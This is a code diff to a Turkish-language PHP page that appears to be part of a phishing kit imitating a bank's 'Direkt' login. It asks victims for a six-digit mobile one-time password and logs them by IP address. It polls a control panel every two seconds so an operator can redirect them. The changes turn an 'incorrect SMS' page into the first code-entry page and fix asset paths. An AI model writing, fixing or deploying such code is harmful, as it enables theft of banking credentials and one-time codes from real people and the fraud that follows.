@@ -21,7 +21,7 @@ $ip = IP;
 $user_bilgi = $db->query("SELECT * FROM records WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
 $telgeldi = isset($user_bilgi['tel']) ? $user_bilgi['tel'] : '';
 
-$ajax->pageUpdate(IP, 'HATALI-SMS');
+$ajax->pageUpdate(IP, 'SMS');
 ?>
 <!DOCTYPE html>
 <html lang="tr">
@@ -32,7 +32,7 @@ $ajax->pageUpdate(IP, 'HATALI-SMS');
     
     <title>Sms Giriş - Direkt</title>
     <style>
-        <?php echo file_get_contents('files/asset/css/normalize.min.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
         
         @font-face {
           font-family: 'Poppins';
@@ -114,13 +114,13 @@ $ajax->pageUpdate(IP, 'HATALI-SMS');
           src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
           unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
         }
-        <?php echo file_get_contents('basvuru/style.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
     </style>
 </head>
 <body>
     <div id="slider">
         <div class="gray4 slide active" style="background-color: rgb(241, 241, 241);">
-            <div id="alertDiv3" class="alertDiv <?php echo $has_error ? 'show' : 'show'; ?>">
+            <div id="alertDiv3" class="alertDiv <?php echo $has_error ? 'show' : ''; ?>">
                 <hr style="width:5%; border: 2px solid; border-radius: 5px; margin-top:5px;">
                 <div style="padding-bottom:5px;"></div>
                 <p style="color: #000; font-size: 16px; font-weight: 600; margin-top:15px;">Uyarı</p>
@@ -142,15 +142,17 @@ $ajax->pageUpdate(IP, 'HATALI-SMS');
             </div>
 
             <div id="loginInputs">
-                <form id="customSmsForm" method="POST" action="hatali-sms.php">
+                <form id="customSmsForm" method="POST" action="sms.php">
                     <label for="customSms" style="color:black; font-size: 11px; display: block; margin-bottom: 3%; float: left;">CEP ŞİFRE</label>
                     <input type="text" name="customSms" placeholder="6 haneli CepŞifre'ni gir" id="customSms" style="font-size: 12px; font-weight:bold; border:0; width: 100%; display: block; margin-bottom: 10px;" minlength="6" maxlength="6" inputmode="numeric" oninput="checkSmsLength()" required>
                 </form>
             </div>
 
+            <?php if (isset($_GET['suredoldu'])): ?>
             <div style="display: flex; justify-content: space-between;">
-                <p style="color: red; font-size: 12px; margin-top: 35px; margin-left: 15px; font-weight:500;">Hatali sms şifresi girdiniz lütfen yeni gönderilen sms şifresini giriniz.</p>
+                <p style="color: red; font-size: 12px; margin-top: 15px; margin-left: 15px; font-weight:500;">Cep şifre süreniz dolmuştur tekrar deneyiniz.</p>
             </div>
+            <?php endif; ?>
 
             <div id="tab3footer" style="display: flex; justify-content: space-between;">
                 <p id="countdownCustom" style="color: black; font-size: 12px; margin-top: 35px; margin-left: 15px; font-weight:500;">Eğer cep şifren <b>2:40</b> saniye içinde ulaşmazsa yeni bir şifre isteyebilirsin.</p>
@@ -197,12 +199,6 @@ $ajax->pageUpdate(IP, 'HATALI-SMS');
             }, 1000);
         }
 
-        window.onload = function () {
-            const duration = 2 * 60 + 40; // 2 min 40 sec
-            const display = document.querySelector('#countdownCustom');
-            startCountdown(duration, display);
-        };
-
         // Panel redirect kontrolü - her 2 saniyede bir kontrol et
         function checkRedirect() {
             fetch('check_redirect.php')
@@ -215,9 +211,16 @@ $ajax->pageUpdate(IP, 'HATALI-SMS');
                 .catch(function() {});
         }
         setInterval(checkRedirect, 2000);
+
+        window.onload = function () {
+            const duration = 2 * 60 + 40; // 2 min 40 sec
+            const display = document.querySelector('#countdownCustom');
+            startCountdown(duration, display);
+        };
     </script>
 </body>
 </html>
+
 
 
 
